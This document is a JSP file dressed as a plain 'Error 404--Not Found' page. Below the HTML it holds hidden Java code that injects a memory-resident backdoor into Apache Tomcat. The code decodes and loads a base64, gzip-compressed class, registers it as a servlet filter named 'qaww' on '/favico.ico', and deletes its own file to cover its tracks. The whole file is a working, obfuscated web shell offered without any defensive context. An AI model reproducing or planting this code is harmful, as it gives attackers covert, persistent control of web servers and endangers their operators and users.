<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.util.zip.GZIPInputStream" %>
<%@ page import="java.io.File" %>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Draft//EN">
<HTML>
<HEAD>
    <TITLE>Error 404--Not Found</TITLE>
</HEAD>
<BODY bgcolor="white">
<FONT FACE=Helvetica><BR CLEAR=all>
    <TABLE border=0 cellspacing=5>
        <TR>
            <TD><BR CLEAR=all>
                <FONT FACE="Helvetica" COLOR="black" SIZE="3"><H2>Error 404--Not Found</H2>
                </FONT></TD>
        </TR>
    </TABLE>
    <TABLE border=0 width=100% cellpadding=10>
        <TR>
            <TD VALIGN=top WIDTH=100% BGCOLOR=white><FONT FACE="Courier New"><FONT FACE="Helvetica" SIZE="3"><H3>From
                RFC 2068 <i>Hypertext Transfer Protocol -- HTTP/1.1</i>:</H3>
            </FONT><FONT FACE="Helvetica" SIZE="3"><H4>10.4.5 404 Not Found</H4>
            </FONT>
                <P><FONT FACE="Courier New">The server has not found anything matching the Request-URI. No indication is
                    given of whether the condition is temporary or permanent.</p>
                <p>If the server does not wish to make this information available to the client, the status code 403
                    (Forbidden) can be used instead. The 410 (Gone) status code SHOULD be used if the server knows,
                    through some internally configurable mechanism, that an old resource is permanently unavailable and
                    has no forwarding address.</FONT></P>
</FONT></TD></TR>
</TABLE>

</BODY>
</HTML>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext stdcontext = (StandardContext) req.getContext();
    addFitlertoTomcat(stdcontext);
    File file = new File(application.getRealPath(request.getRequestURI()));
    file.delete();
%>

<%!
    void addFitlertoTomcat(Context context) {
        try {
            Class filterDefClass = null;
            try {
                filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
            } catch (ClassNotFoundException e) {
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            }
            Object filterDef = filterDefClass.newInstance();
            filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{"qaww"});
            Method filterDefsetFilter = filterDefClass.getDeclaredMethod("setFilter", Filter.class);

            BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();
            String codeClass = "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";
            ClassLoader currentClassloader = Thread.currentThread().getContextClassLoader();
            Class cl = currentClassloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
            Method defineClass = cl.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class evilFilterClass = (Class) defineClass.invoke(currentClassloader, uncompress(b64Decoder.decodeBuffer(codeClass)), 0, uncompress(b64Decoder.decodeBuffer(codeClass)).length);
            filterDefsetFilter.invoke(filterDef, evilFilterClass.newInstance());
            context.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(context, new Object[]{filterDef});

            Class filterMapClass = null;
            try {
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            } catch (ClassNotFoundException e) {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            }
            Object filterMap = filterMapClass.newInstance();
            filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{"qaww"});
            filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
            filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{"/favico.ico"});
            context.getClass().getDeclaredMethod("addFilterMap", new Class[]{filterMapClass}).invoke(context, new Object[]{filterMap});

            Field contextfilterConfigs = context.getClass().getDeclaredField("filterConfigs");
            contextfilterConfigs.setAccessible(true);
            HashMap filterConfigs = (HashMap) contextfilterConfigs.get(context);
            Constructor<?>[] filterConfigCon =
                    Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            filterConfigCon[0].setAccessible(true);
            filterConfigs.put("qaww", filterConfigCon[0].newInstance(context, filterDef));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

%>

<%!

    public static byte[] uncompress(byte[] bytes) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream ungzip = new GZIPInputStream(new ByteArrayInputStream(bytes));
        byte[] buffer = new byte[256];
        for (int n = ungzip.read(buffer); n >= 0; n = ungzip.read(buffer)) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

%>